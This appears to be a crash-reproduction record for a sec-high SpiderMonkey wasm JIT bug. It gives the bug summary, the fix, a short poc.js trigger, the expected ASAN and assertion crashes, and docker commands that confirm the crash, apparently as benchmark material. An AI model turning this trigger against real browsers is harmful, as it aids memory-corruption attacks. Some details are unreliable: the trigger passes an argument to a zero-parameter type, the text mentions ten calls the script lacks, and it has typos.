# Bugzilla 1917807 / CVE-2024-9403

**Title:** Wasm JIT entry frame footer is wrong for `return_call_indirect` with multi-arg targets
**Severity:** sec-high (MFSA 2024-50, Firefox 131)
**Component:** SpiderMonkey — Wasm + Jit frames — `js/src/wasm/WasmFrameIter.cpp`, `js/src/wasm/WasmStubs.cpp`, `js/src/jit/JitFrames.cpp`
**Fix commit:** `16781a13b5ecce172cf06a272f1cee629c9afee2` (rev. jandem, 2024-09)
**Vulnerable revision:** `16781a13b5ecce172cf06a272f1cee629c9afee2~1`

## Summary

`GenerateJitEntry` builds the trampoline that calls a wasm function
from JS. The trampoline reserves a JIT-to-wasm exit-frame footer
whose size depends on the *callee's* parameter layout. When the wasm
callee performs a `return_call_indirect`, the tail-called function
inherits the entry trampoline's frame, but the footer's expected
parameter-area size is taken from the original callee, not the
final tail target. If the two disagree (e.g. caller takes 7 i32
params, tail target takes 0), the recorded
`ExitFrameType` no longer matches what the frame walker expects.

When the tail callee then traps, `WasmFrameIter::popFrame` walks the
exit footer via `AssertJitExitFrame`. The footer's `type()` byte is
read from a stale offset and contains attacker-influenced data,
triggering the assertion in debug and an OOB read/write that lands at
address `0x0` under ASAN.

## Fix

`GenerateJitEntry` is corrected to use the tail-call-safe parameter
alignment, and the matching readers in `JitFrames.cpp` /
`WasmFrameIter.cpp` are taught to interpret the new layout. The
`footer()->type()` invariant now holds across `return_call_indirect`.

## Trigger (`poc.js`)

```js
processWAST(`(module (table 2 2 funcref)
(elem (i32.const 0) $odd $odd)
(type $t (func (param) (result i32)))
(func $odd (export "odd") (param i32 i32 i32 i32 i32 i32 i32) (result i32)
  (return_call_indirect (type $t) (i32.const 1) (local.get 1))))`);
```

The exported `odd` is invoked 10 times from JS. The first
invocation's tail call sets up the malformed frame; the trap that
follows (zero arguments don't fit the assumed 7-slot footer) then
fault-faults inside `WasmFrameIter::popFrame`.

## Expected crash

Debug build: `Assertion failure: jitCaller->footer()->type() ==
expected, at js/src/wasm/WasmFrameIter.cpp:190`.
ASAN build: SEGV (write to `0x0`) inside
`AssertJitExitFrame(void const*, js::jit::ExitFrameType)` reached
from `WasmFrameIter::popFrame` → `js::FrameIter::operator++` →
`js::SavedStacks::insertFrames` (the trap reporter walks the stack
to attach a JS error).

## Verification

```sh
docker build -t hwiwonlee/sm.x86_64:1917807 spidermonkey/1917807
bash spidermonkey/crash_check.sh 1917807
```

Expected: `CONFIMRED: ASAN_CRASH`.
